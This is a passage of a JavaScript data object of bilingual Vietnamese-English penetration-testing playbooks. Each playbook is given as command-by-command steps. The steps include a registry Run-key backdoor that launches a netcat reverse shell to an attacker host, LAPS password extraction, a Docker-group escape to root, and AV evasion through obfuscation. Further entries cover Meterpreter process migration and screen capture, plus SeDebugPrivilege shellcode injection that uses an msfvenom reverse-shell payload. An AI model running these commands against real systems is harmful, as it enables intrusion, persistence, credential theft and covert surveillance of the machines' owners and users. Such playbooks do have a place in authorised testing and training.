      {"vi": "**Chuẩn bị Payload & Listener:**", "en": "**Prepare Payload & Listener:**", "command": "# Upload nc.exe/rev.ps1 to target; rlwrap nc -lvnp 4450 on Kali"},
      {"vi": "**Thêm Run Key (User):**", "en": "**Add Run Key (User):**", "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoor\" /t REG_SZ /d \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4450 -e cmd.exe\" /f"},
      {"vi": "**Thêm Run Key (Machine - Admin):**", "en": "**Add Run Key (Machine - Admin):**", "command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoorAll\" /t REG_SZ /d \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4450 -e cmd.exe\" /f"},
      {"vi": "**Kiểm tra Key:**", "en": "**Check Key:**", "command": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoor\""},
      {"vi": "**Chờ Login/Logout:**", "en": "**Wait for Login/Logout:**"}
    ],
    "related_knowledge_ids": ["winprivesc_autorun", "reg add", "reg query", "persistence", "nc", "powershell", "reverse_shell"]
  },
  "playbook_82_ad_enum_trusts": {
    "title": {
      "vi": "Playbook 82: AD Enumeration - Liệt kê Domain Trusts (PowerView)",
      "en": "Playbook 82: AD Enumeration - Listing Domain Trusts (PowerView)"
    },
    "assumption": "Có shell PowerShell trên máy join domain, có `PowerView.ps1`.",
    "objective": "Xác định các mối quan hệ trust giữa domain và các domain/forest khác.",
    "tools": ["powershell", "powerview"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration", "Domain Trust Enumeration"],
    "targets": ["Active Directory Trusts"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "enumeration", "powerview", "powershell", "domain trust", "forest trust"],
    "content": "## Playbook 82: AD Enum - Domain Trusts 🕵️‍♂️🤝\n\n**Giả định:** Có shell PS, có `PowerView.ps1`.\n\n**Mục tiêu:** Liệt kê domain/forest trusts.\n\n**Các bước thực hiện:**\n\n1.  **Import:** `Import-Module .\\PowerView.ps1`.\n2.  **Domain Trusts:** `Get-NetDomainTrust`.\n3.  **Forest Trusts:** `Get-NetForestTrust`.\n4.  **Phân tích:** Tìm trusts có thể lạm dụng.",
    "steps": [
      {"vi": "**Import PowerView:**", "en": "**Import PowerView:**", "command": "Import-Module .\\PowerView.ps1"},
      {"vi": "**Liệt kê Domain Trusts:**", "en": "**List Domain Trusts:**", "command": "Get-NetDomainTrust"},
      {"vi": "**Liệt kê Forest Trusts:**", "en": "**List Forest Trusts:**", "command": "Get-NetForestTrust"}
    ],
    "related_knowledge_ids": ["ad_pentest_enum_powerview", "powerview", "powershell", "domain trust", "forest trust"]
  },
  "playbook_83_ad_enum_gpo": {
    "title": {
      "vi": "Playbook 83: AD Enumeration - Liệt kê GPOs (PowerView)",
      "en": "Playbook 83: AD Enumeration - Listing GPOs (PowerView)"
    },
    "assumption": "Có shell PowerShell trên máy join domain, có `PowerView.ps1`.",
    "objective": "Liệt kê GPOs và xác định GPO áp dụng cho đối tượng cụ thể.",
    "tools": ["powershell", "powerview"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration", "GPO Enumeration"],
    "targets": ["Group Policy Objects (GPO)"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "enumeration", "powerview", "powershell", "gpo", "group policy"],
    "content": "## Playbook 83: AD Enum - Group Policy Objects 🕵️‍♂️📜\n\n**Giả định:** Có shell PS, có `PowerView.ps1`.\n\n**Mục tiêu:** Liệt kê và phân tích GPOs.\n\n**Các bước thực hiện:**\n\n1.  **Import:** `Import-Module .\\PowerView.ps1`.\n2.  **List All:** `Get-NetGPO`.\n3.  **List for Computer:** `Get-NetGPO -ComputerName $env:COMPUTERNAME`.\n4.  **List for User:** `Get-NetGPO -UserName <user>`.\n5.  **List for Group:** `Get-NetGPOGroup -GroupName \"Group\"`.\n6.  **Phân tích:** Tìm GPP passwords (SYSVOL), script logon, cấu hình không an toàn.",
    "steps": [
      {"vi": "**Import PowerView:**", "en": "**Import PowerView:**", "command": "Import-Module .\\PowerView.ps1"},
      {"vi": "**Liệt kê Tất cả GPOs:**", "en": "**List All GPOs:**", "command": "Get-NetGPO"},
      {"vi": "**GPOs cho Máy Hiện tại:**", "en": "**GPOs for Current Computer:**", "command": "Get-NetGPO -ComputerName $env:COMPUTERNAME"},
      {"vi": "**GPOs cho Group 'Domain Admins':**", "en": "**GPOs for 'Domain Admins' Group:**", "command": "Get-NetGPOGroup -GroupName \"Domain Admins\""}
    ],
    "related_knowledge_ids": ["ad_pentest_enum_powerview", "powerview", "powershell", "gpo", "group policy", "playbook_57_ad_enum_powerview_focus", "playbook_24_ad_attack_gpp_decrypt"]
  },
  "playbook_84_ad_enum_laps": {
    "title": {
      "vi": "Playbook 84: AD Enumeration - Tìm LAPS Password (ldapsearch)",
      "en": "Playbook 84: AD Enumeration - Finding LAPS Password (ldapsearch)"
    },
    "assumption": "Có quyền đọc thuộc tính LAPS (`ms-MCS-AdmPwd`) qua LDAP.",
    "objective": "Truy vấn LDAP để lấy mật khẩu local admin được quản lý bởi LAPS.",
    "tools": ["ldapsearch"],
    "phases": ["Credential Access", "Enumeration"],
    "techniques": ["Active Directory Enumeration", "LAPS Abuse"],
    "targets": ["LAPS Passwords", "Active Directory Computer Objects"],
    "os": ["Any (LDAP Client)"],
    "tags": ["ad", "active directory", "enumeration", "credential access", "laps", "ldap", "ldapsearch", "ms-mcs-admpwd"],
    "content": "## Playbook 84: AD Enum - LAPS Password 🕵️‍♂️💻🔑\n\n**Giả định:** Có quyền đọc thuộc tính LAPS (`ms-MCS-AdmPwd`) qua LDAP.\n\n**Mục tiêu:** Lấy mật khẩu LAPS.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Computer Target.**\n2.  **Truy vấn LDAP:** `ldapsearch -H ldap://<DC> -D '<user>' -w '<pass>' -b '<baseDN>' '(&(objectClass=computer)(cn=<Computer>))' ms-MCS-AdmPwd`.\n3.  **Lấy Mật khẩu:** Trích xuất từ output.\n4.  **Sử dụng:** Đăng nhập vào máy tính đó với user `Administrator` và mật khẩu LAPS.",
    "steps": [
      {"vi": "**Truy vấn LDAP:**", "en": "**Query LDAP:**", "command": "ldapsearch -H ldap://<DC_IP> -D '<user_dn>' -w '<password>' -b '<domain_dn>' '(&(objectClass=computer)(cn=<ComputerName>))' ms-MCS-AdmPwd"},
      {"vi": "**Lấy Mật khẩu:**", "en": "**Get Password:**", "command": "# Extract password from ms-MCS-AdmPwd attribute in output"},
      {"vi": "**Sử dụng Mật khẩu (Ví dụ RDP):**", "en": "**Use Password (Example RDP):**", "command": "xfreerdp /v:<ComputerName> /u:Administrator /p:<LAPS_Password>"}
    ],
    "related_knowledge_ids": ["initial_ldap_enum", "ldap", "ldapsearch", "laps", "ad", "active_directory", "ms-mcs-admpwd", "xfreerdp"]
  },
  "playbook_85_foothold_default_creds": {
    "title": {
      "vi": "Playbook 85: Foothold qua Default Credentials",
      "en": "Playbook 85: Foothold via Default Credentials"
    },
    "assumption": "Phát hiện dịch vụ có thể có default credentials.",
    "objective": "Thử đăng nhập bằng username/password mặc định.",
    "tools": ["nmap", "hydra", "web browser", "ssh", "ftp", "mysql", "impacket-mssqlclient"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Default Credentials", "Password Guessing"],
    "targets": ["Various Services (Web, SSH, FTP, DB, etc.)"],
    "os": ["Any"],
    "tags": ["foothold", "default credentials", "password guessing", "web", "ssh", "ftp", "database", "tomcat", "jenkins"],
    "content": "## Playbook 85: Foothold qua Default Credentials 🚪🔑❓\n\n**Giả định:** Phát hiện dịch vụ có thể dùng default creds.\n\n**Mục tiêu:** Thử đăng nhập bằng default creds.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Dịch vụ/Version:** Nmap `-sV`.\n2.  **Tìm Default Creds:** Google, cirt.net, danh sách phổ biến.\n3.  **Thử Đăng nhập:** Web (Browser), SSH, FTP, DB (mysql, impacket-mssqlclient), Hydra.",
    "steps": [
      {"vi": "**Xác định Dịch vụ/Version:**", "en": "**Identify Service/Version:**", "command": "nmap -sV -p <port> <target_ip>"},
      {"vi": "**Tìm Default Creds (Google):**", "en": "**Find Default Creds (Google):**", "command": "# Search: \"<Service> <Version> default password\""},
      {"vi": "**Thử Đăng nhập Web:**", "en": "**Try Web Login:**", "command": "# Use browser with common defaults (admin:admin, etc.)"},
      {"vi": "**Thử Đăng nhập SSH:**", "en": "**Try SSH Login:**", "command": "ssh root@<target_ip> # (Try default passwords)"},
      {"vi": "**Thử Đăng nhập FTP Anon:**", "en": "**Try FTP Anon Login:**", "command": "ftp <target_ip> # (User: anonymous, Pass: anonymous)"},
      {"vi": "**Thử Đăng nhập MySQL Root:**", "en": "**Try MySQL Root Login:**", "command": "mysql -u root -p -h <target_ip> # (Try blank, root, password)"}
    ],
    "related_knowledge_ids": ["nmap", "password_guessing_strategies", "hydra", "ssh", "ftp", "mysql", "impacket-mssqlclient", "port_21", "playbook_78_linux_foothold_creds_wpconfig", "playbook_32_foothold_mssql_xpcmdshell"]
  },
  "playbook_86_linux_privesc_docker_escape": {
    "title": {
      "vi": "Playbook 86: Linux PrivEsc qua Docker Escape (Volume Mount)",
      "en": "Playbook 86: Linux PrivEsc via Docker Escape (Volume Mount)"
    },
    "assumption": "Có shell user thuộc nhóm `docker`.",
    "objective": "Leo thang lên root host bằng cách mount filesystem của host vào container.",
    "tools": ["docker", "id", "groups"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Docker Escape", "Privilege Escalation"],
    "targets": ["Docker Socket", "Host Filesystem"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "docker", "docker escape", "volume mount", "root"],
    "content": "## Playbook 86: Linux PrivEsc - Docker Escape (Mount) 🐳⬆️👑\n\n**Giả định:** User thuộc nhóm `docker`.\n\n**Mục tiêu:** Leo thang lên root host.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Quyền:** `id`.\n2.  **Chạy Container:** `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.\n3.  **Xác nhận Root:** `id` (trong shell container).",
    "steps": [
      {"vi": "**Kiểm tra Nhóm Docker:**", "en": "**Check Docker Group:**", "command": "id"},
      {"vi": "**Chạy Docker Mount & Chroot:**", "en": "**Run Docker Mount & Chroot:**", "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
      {"vi": "**Xác nhận Root (trong container):**", "en": "**Confirm Root (in container):**", "command": "id"}
    ],
    "related_knowledge_ids": ["linuxprivesc_manual_other", "docker", "docker escape", "privesc"]
  },
  "playbook_87_av_evasion_manual_obfuscation": {
    "title": {
      "vi": "Playbook 87: AV Evasion - Obfuscation Thủ công (Scripting)",
      "en": "Playbook 87: AV Evasion - Manual Obfuscation (Scripting)"
    },
    "assumption": "Script payload (PS1, PY, VBS) bị AV phát hiện.",
    "objective": "Sửa đổi script để thay đổi signature và bypass AV.",
    "tools": ["text editor", "base64", "Invoke-Obfuscation (Optional)"],
    "phases": ["Defense Evasion"],
    "techniques": ["AV Evasion", "Obfuscation", "Code Manipulation"],
    "targets": ["Antivirus", "Script Payload (PS1, PY, VBS)"],
    "os": ["Any (Scripting Language Dependent)"],
    "tags": ["av evasion", "obfuscation", "manual evasion", "powershell", "python", "bypass", "signature bypass", "code manipulation"],
    "content": "## Playbook 87: AV Evasion - Obfuscation Thủ công 🛡️🎭➡️🐚\n\n**Giả định:** Script payload bị AV chặn.\n\n**Mục tiêu:** Thay đổi signature script để bypass AV.\n\n**Các bước thực hiện:**\n\n1.  **Đổi tên Biến/Hàm.**\n2.  **Thay đổi Cấu trúc:** Thêm comment/space, tách chuỗi, mã hóa chuỗi (base64/XOR), đổi thứ tự hàm, thêm logic rác.\n3.  **Thay đổi Cách Gọi:** Dùng alias (PS), `exec()` (PY), `Get-Command` (PS).\n4.  **Kiểm tra & Lặp lại.**",
    "steps": [
      {"vi": "**Đổi tên Biến/Hàm:**", "en": "**Rename Variables/Functions:**", "command": "# Manually edit script"},
      {"vi": "**Tách Chuỗi:**", "en": "**Split Strings:**", "command": "# Example: \"Virtual\" + \"Alloc\""},
      {"vi": "**Mã hóa Chuỗi (Base64):**", "en": "**Encode Strings (Base64):**", "command": "# Example PS: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"...\"))"},
      {"vi": "**Thêm Logic Rác:**", "en": "**Add Junk Logic:**", "command": "# Example: $x = 1+1; if ($x -eq 2) { # Real code }"},
      {"vi": "**Kiểm tra lại:**", "en": "**Re-check:**", "command": "# Test against AV/sandbox"}
    ],
    "related_knowledge_ids": ["av_evasion", "obfuscation", "manual_evasion", "powershell", "python", "base64", "av_evasion_manual_powershell"]
  },
  "playbook_88_metasploit_post_migrate": {
    "title": {
      "vi": "Playbook 88: Metasploit Post-Ex - Migrate Process",
      "en": "Playbook 88: Metasploit Post-Ex - Migrate Process"
    },
    "assumption": "Có Meterpreter session, cần chuyển sang process ổn định/ít bị chú ý hơn.",
    "objective": "Migrate Meterpreter sang process khác.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Defense Evasion"],
    "techniques": ["Process Migration"],
    "targets": ["Windows Processes"],
    "os": ["Windows"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "migrate", "process migration", "defense evasion"],
    "content": "## Playbook 88: Metasploit Post-Ex - Migrate Process 🕵️‍♀️➡️🏃‍♂️ (MSF)\n\n**Giả định:** Có Meterpreter, cần chuyển process.\n\n**Mục tiêu:** Migrate Meterpreter.\n\n**Các bước thực hiện:**\n\n1.  **List Processes:** `ps`.\n2.  **Chọn Target:** Tìm process ổn định (explorer.exe, svchost.exe), cùng kiến trúc, ghi PID.\n3.  **Migrate:** `migrate <PID>`.\n4.  **Kiểm tra:** `getpid`, `getuid`.",
    "steps": [
      {"vi": "**Liệt kê Processes:**", "en": "**List Processes:**", "command": "ps"},
      {"vi": "**Chọn Target Process (PID):**", "en": "**Choose Target Process (PID):**", "command": "# Find stable process (e.g., explorer.exe) with matching architecture"},
      {"vi": "**Migrate:**", "en": "**Migrate:**", "command": "migrate <PID>"},
      {"vi": "**Kiểm tra PID/UID:**", "en": "**Check PID/UID:**", "command": "getpid; getuid"}
    ],
    "related_knowledge_ids": ["metasploit_post_exploitation_core", "meterpreter", "migrate", "ps", "metasploit_post_exploitation_lab_getsystem_migrate"]
  },
  "playbook_89_windows_privesc_sedebugprivilege": {
    "title": {
      "vi": "Playbook 89: Windows PrivEsc qua SeDebugPrivilege",
      "en": "Playbook 89: Windows PrivEsc via SeDebugPrivilege"
    },
    "assumption": "User có `SeDebugPrivilege`.",
    "objective": "Lạm dụng SeDebugPrivilege để inject shellcode vào process SYSTEM.",
    "tools": ["whoami", "powershell", "msfvenom", "nc", "procdump (optional)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Privilege Abuse", "SeDebugPrivilege", "Process Injection", "Shellcode Injection"],
    "targets": ["Windows Privileges", "SYSTEM Processes"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "sedebugprivilege", "privilege abuse", "process injection", "shellcode", "powershell", "mimikatz (indirectly)"],
    "content": "## Playbook 89: Windows PrivEsc qua SeDebugPrivilege 💻⬆️💉➡️👑\n\n**Giả định:** User có `SeDebugPrivilege`.\n\n**Mục tiêu:** Leo thang lên SYSTEM bằng inject vào process SYSTEM.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận:** `whoami /priv`.\n2.  **Shellcode:** `msfvenom -p ... -f ps1 -v ShellcodeBytes`.\n3.  **Script Injection:** Tìm/viết script PS dùng WinAPI (OpenProcess, VirtualAllocEx, ...).\n4.  **Target Process:** Tìm PID process SYSTEM 64-bit (`Get-Process | ? {$_.SI -eq 0 ...}`).\n5.  **Inject:** Tải script, mở listener (`nc`), chạy script (`powershell -ep bypass -File inject.ps1 -PID <PID>`).",
    "steps": [
      {"vi": "**Xác nhận Privilege:**", "en": "**Confirm Privilege:**", "command": "whoami /priv"},
      {"vi": "**Tạo Shellcode (PS Byte Array):**", "en": "**Create Shellcode (PS Byte Array):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4451 -f ps1 -v ShellcodeBytes"},
      {"vi": "**Chuẩn bị/Tải Script Injection:**", "en": "**Prepare/Upload Injection Script:**", "command": "# Create/Find PS script using WinAPI for injection, include shellcode bytes"},
      {"vi": "**Tìm PID Process SYSTEM:**", "en": "**Find SYSTEM Process PID:**", "command": "Get-Process | ? {$_.SI -eq 0 -and $_.Architecture -eq 'X64'} | select Id,ProcessName"}, // Thêm check Architecture
      {"vi": "**Mở Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4451"},
      {"vi": "**Chạy Script Injection:**", "en": "**Run Injection Script:**", "command": "powershell -ep bypass -File .\\inject.ps1 -ProcessId <SYSTEM_PID>"}
    ],
    "related_knowledge_ids": ["winprivesc_exploits_theory", "whoami /priv", "powershell", "msfvenom", "shellcode", "process_injection", "nc"]
  },
  "playbook_90_metasploit_post_screen_capture": {
    "title": {
      "vi": "Playbook 90: Metasploit Post-Ex - Chụp Ảnh Màn hình",
      "en": "Playbook 90: Metasploit Post-Ex - Screen Capture"
    },
    "assumption": "Có Meterpreter session trên máy có desktop.",
    "objective": "Chụp ảnh màn hình hiện tại của người dùng.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Collection"],
    "techniques": ["Screen Capture"],
    "targets": ["User Desktop Session"],
    "os": ["Windows", "Linux (Desktop)"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "screen capture", "collection", "screenshot"],
    "content": "## Playbook 90: Metasploit Post-Ex - Chụp Ảnh Màn hình 📸\n\n**Giả định:** Có Meterpreter session trên máy có desktop.\n\n**Mục tiêu:** Chụp ảnh màn hình desktop.\n\n**Các bước thực hiện:**\n\n1.  **Chụp Ảnh (Meterpreter):** `screenshot`.\n2.  **Xem Ảnh (Kali):** Mở file ảnh trong thư mục loot.",
    "steps": [
      {"vi": "**Vào Meterpreter Session:**", "en": "**Enter Meterpreter Session:**", "command": "sessions -i <id>"},
      {"vi": "**Chụp Ảnh:**", "en": "**Take Screenshot:**", "command": "screenshot"},
      {"vi": "**Xem Ảnh (Trên Kali):**", "en": "**View Screenshot (On Kali):**", "command": "# Open the saved image file from the loot directory (~/.msf4/loot/)"}
    ],
    "related_knowledge_ids": ["metasploit", "meterpreter", "post_exploitation", "screenshot"]
  }
}; // Kết thúc object PLAYBOOKS// 
 // *** Kết thúc Object PLAYBOOKS ***
